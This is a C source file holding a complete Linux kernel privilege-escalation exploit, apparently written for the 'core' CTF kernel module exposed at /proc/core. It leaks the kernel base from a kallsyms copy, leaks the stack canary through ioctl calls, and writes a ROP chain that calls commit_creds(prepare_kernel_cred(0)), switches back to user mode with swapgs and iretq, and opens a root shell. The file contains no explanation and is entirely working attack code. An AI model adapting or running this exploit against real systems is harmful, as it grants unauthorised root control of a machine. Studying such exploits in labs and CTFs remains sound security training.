#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<fcntl.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<sys/ioctl.h>
size_t u_cs, u_rflags, u_rsp, u_ss;
size_t commit_creds;
size_t prepare_kernel_cred;
long commit_creds_offset = 0x9c8e0;
long prepare_kernel_cred_offset = 0x9cce0;

void save_status(){
    __asm__(
        "mov u_cs, cs;"
        "mov u_ss, ss;"
        "mov u_rsp, rsp;"
        "pushf;"
        "pop u_rflags;"
    );
}

int leak_kernal_base(){
    FILE * fd = fopen("/tmp/kallsyms", "r");
    if(fd == NULL){
        puts("[-] open file failed!");
        exit(-1);
    }
    char buf[0x40];
    while(fgets(buf, 0x30, fd)){
        if(strstr(buf, "commit_creds")){
            char ptr[0x18];
            strncpy(ptr, buf, 0x10);
            sscanf(ptr, "%lx", &commit_creds);
            printf("[+] commit_creds: 0x%lx\n", commit_creds);
            prepare_kernel_cred = commit_creds - commit_creds_offset + prepare_kernel_cred_offset;
            fclose(fd);
            return commit_creds - commit_creds_offset;
        }
        else if(strstr(buf, "prepare_kernel_cred")){
            char ptr[0x18];
            strncpy(ptr, buf, 0x10);
            sscanf(ptr, "%lx", &prepare_kernel_cred);
            printf("[+] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
            commit_creds = prepare_kernel_cred - prepare_kernel_cred_offset + commit_creds_offset;
            fclose(fd);
            return prepare_kernel_cred - prepare_kernel_cred_offset;
        }
    }
    fclose(fd);
    return 0;   
}

size_t leak_canary(int fd){
    ioctl(fd, 0x6677889C, 0x40);
    long temp[8];
    ioctl(fd, 0x6677889B, (char*)temp);
    return temp[0];
}

void C_get_root(){
    void* (*cc)(char *) = commit_creds;
    char* (*pkc)(int) = prepare_kernel_cred;
    (*cc)((*pkc)(0)); // commit_creds(prepare_kernel_cred(0));
}

void backdoor(){
    if(getuid() == 0)
        system("/bin/sh");
    else{
        puts("[-] Failed!");
        exit(-1);
    }
}

int main(){
    save_status();
    //leak kernel base
    size_t kernel_base = leak_kernal_base();
    if(!kernel_base){
        printf("[-] leak kernel_base failed!");
        exit(-1);
    }
    printf("[+] kernel base: 0x%lx\n", kernel_base);
    int fd = open("/proc/core", 2);
    //leak canary
    size_t canary = leak_canary(fd);
    printf("[+] canary: 0x%lx\n", canary);
    
    size_t rop[19];
    int idx;
    for(idx = 0; idx < 10; idx++){
        rop[idx] = canary;
    }
    rop[idx++] = (long)C_get_root;
    rop[idx++] = kernel_base + 0xa012da;//swagps
    rop[idx++] = 0;
    rop[idx++] = kernel_base + 0x50ac2;//iretq
    rop[idx++] = (long)backdoor;
    rop[idx++] = u_cs;
    rop[idx++] = u_rflags;
    rop[idx++] = u_rsp;
    rop[idx++] = u_ss;
    write(fd, (char*)rop, sizeof(rop));
    puts("[+] get shell!");
    ioctl(fd, 0x6677889A, 0xffffffff00000000+sizeof(rop));

    return 0;
}